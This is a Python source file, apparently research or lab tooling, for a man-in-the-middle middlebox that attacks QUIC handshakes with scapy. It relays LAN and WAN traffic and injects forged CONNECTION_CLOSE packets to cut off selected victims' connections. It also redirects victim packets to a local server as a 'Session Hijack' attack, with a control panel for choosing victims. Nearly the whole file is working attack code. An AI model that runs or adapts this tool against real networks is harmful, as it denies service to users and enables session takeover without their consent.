import os, signal
import argparse

from scapy.all import sniff, send, bind_layers, UDP, get_if_hwaddr, Ether, IP


#from scapy.layers.quic import *
from quic_extend import *
from quic_extend import QUIC, QUIC_Initial
#load_contrib("quic")
from connection_close import QUIC_CONNECTION_CLOSE, QUIC_CONNECTION_CLOSE_0x1C_PAYLOAD
bind_layers(UDP, QUIC, dport=443)
bind_layers(UDP, QUIC, sport=443)

bind_layers(UDP, QUIC, dport=4433)
bind_layers(UDP, QUIC, sport=4433)

from forge import forge_cc_scapy, forge_cc_2
import threading, sys, os, multiprocessing
from victims import Victims, IPv4Address
from quic_protected import *
from test_server.server import main
from aioquic.quic.packet import QuicProtocolVersion






def add_and_send_to_server(pkt):
    new_pkt = pkt[IP]
    new_pkt[IP].src = attacker_outer_iface_ip
    del new_pkt.getlayer(IP).chksum
    del new_pkt.getlayer(UDP).chksum
    #print(f"New PKT to server: {new_pkt.summary()}")
    send(new_pkt, iface=outer_iface, verbose=False)




def dos_attack(victim, version = QuicProtocolVersion.VERSION_1):
    forged = forge_cc_2(
        tpl=(victim[IP].src, victim[UDP].sport, victim[IP].dst, victim[UDP].dport),
        client_scid=victim[QUIC_Initial].SrcConnID,
        client_dcid=victim[QUIC_Initial].DstConnID,
        version=version) 
    if forged is None:
        print("ERROR IN send_a3!")
    else:
        send(forged, iface=inner_iface, verbose=False)

def sh_attack1(pkt):
    new_pkt = pkt[IP]
    new_pkt[IP].dest = attacker_inner_iface_ip
    new_pkt[UDP].dport = 4433
    del new_pkt.getlayer(IP).chksum
    del new_pkt.getlayer(UDP).chksum
    #print(f"New PKT to server: {new_pkt.summary()}")
    send(new_pkt, iface=inner_iface, verbose=False)

def handle_quic(pkt):
    global vs
    if vs.exit:
        raise StopIteration # This will stop the sniff() function
    # Only process if this packet has a QUIC Initial header
    if pkt.haslayer(UDP) and pkt.getlayer(Ether).src != get_if_hwaddr(inner_iface) and pkt.getlayer(Ether).src != get_if_hwaddr(outer_iface):
        if pkt.sniffed_on == inner_iface:
            vs.update(pkt)
            if QUIC_Initial in pkt:
                #print(f"Quic Init in version: {pkt[QUIC_Initial].Version}")
                
                if (vs[pkt[IP].src].status["DoS"] or vs[pkt[IP].src][pkt[IP].dst]["DoS"]):
                    dos_attack(pkt, QuicProtocolVersion(pkt[QUIC_Initial].Version))
                    return
            if QUIC in pkt and (vs[pkt[IP].src].status["Session Hijack"] or vs[pkt[IP].src][pkt[IP].dst]["Session Hijack"]):
                sh_attack1(pkt)
                print("Sent shit")
            add_and_send_to_server(pkt)
            
            

                    
        elif pkt.sniffed_on == outer_iface:
            new_dst = vs.find_victim_from_wan(pkt[IP].src, pkt[UDP].dport)
            if new_dst != "":
                #print(f"From server: {pkt.summary()}")
                new_pkt = pkt[IP]
                new_pkt[IP].dst = new_dst
                del new_pkt.getlayer(IP).chksum
                del new_pkt.getlayer(UDP).chksum
                #print(f"New PKT to client: {new_pkt.summary()}")
                send(new_pkt, iface=inner_iface, verbose=False)
            #else:
                #print("A packet of unknown LAN destination.")
                # Need to fix change of victim sport with new connections of same src and dest ips.






if __name__ == "__main__":
    """
        Global variables, constants and configurations settings.
    """
    # Maybe turnning off ip_forward is not needed, but it let's a race between kernel to attacker_main2.py . (Need more testing.)
    os.system('sysctl -w net.ipv4.ip_forward=0')    # Set middlebox kernel ipv4 forwarding cancelled. So only user space forwarding.
    parser = argparse.ArgumentParser(description="MiTM QUIC Handshake attacks")
    parser.add_argument(
        "--inner-iface",
        type=str,
        default='middlebox-eth0',
        help="The name of the interface/network adapter that connects the middlebox to the LAN network.",
    )
    parser.add_argument(
        "--outer-iface",
        type=str,
        default='middlebox-eth1',
        help="The name of the interface/network adapter that connects the middlebox to the Router/WAN network.",
    )
    parser.add_argument(
        "--outer-iface-ip",
        type=str,
        default="10.69.0.100",
        help="The ip of the middlebox in the interface to the Router/WAN network.",
    )
    parser.add_argument(
        "--inner-iface-ip",
        type=str,
        default="192.168.1.1",
        help="The ip of the middlebox in the interface to the LAN network.",
    )
    args = parser.parse_args()
    
    ##TODO: add changing of those while running 
    inner_iface = args.inner_iface
    try:
        attacker_inner_iface_ip = IPv4Address(args.inner_iface_ip)
    except Exception as e:
        print(e)
        os.system('sysctl -w net.ipv4.ip_forward=1')
        os._exit(1)
    outer_iface = args.outer_iface
    try:
        attacker_outer_iface_ip = IPv4Address(args.outer_iface_ip)
    except Exception as e:
        print(e)
        os.system('sysctl -w net.ipv4.ip_forward=1')
        os._exit(1)
    vs = Victims()
    #print(f"Inner_iface: {inner_iface} , Outer_iface: {outer_iface}")      
    control_panel_thread = threading.Thread(target=vs.run)
    control_panel_thread.start()
    if isinstance(threading.current_thread(), threading._MainThread):
        """p = multiprocessing.Process(target=main,
            args=("0.0.0.0",4433, "./test/ssl_cert.pem", "./test/ssl_key.pem", "./test_server/index.html"), daemon=True)
        p.start()"""
        if multiprocessing.parent_process() is None:
            # Sniff UDP 443 traffic and invoke handle_quic for each packet
            sniff(
                iface=[inner_iface, outer_iface],
                prn=handle_quic,         # callback for every packet
                store=False                  # don’t keep packets in memory
            )
            """p.terminate()
            if p.is_alive():       # very rare, but just in case on Unix:
                os.kill(p.pid, signal.SIGKILL)  # Unix-only sledgehammer
                p.join()"""
            control_panel_thread.join()
    os.system('sysctl -w net.ipv4.ip_forward=1')

        